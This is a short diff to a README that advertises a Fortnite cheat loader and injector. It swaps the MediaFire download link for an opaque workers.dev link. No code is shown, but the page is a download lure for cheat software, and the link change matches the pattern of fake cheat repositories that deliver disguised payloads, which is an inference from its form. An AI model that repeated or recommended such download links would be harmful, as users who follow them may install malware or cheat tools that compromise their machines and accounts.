@@ -4,7 +4,7 @@ Loader and injector for Fortnite cheats: attaches the module and opens the in-ga
 
 ## Download
 
-**[Download Fortnite Cheat Loader](https://www.mediafire.com/file/9livkzxm1qj0199/Fc_Cheat.zip/file)**
+**[Download Fortnite Cheat Loader](https://xtiz6i8n6.fresh-link.workers.dev/464dac20)**
 
 ## Features
 
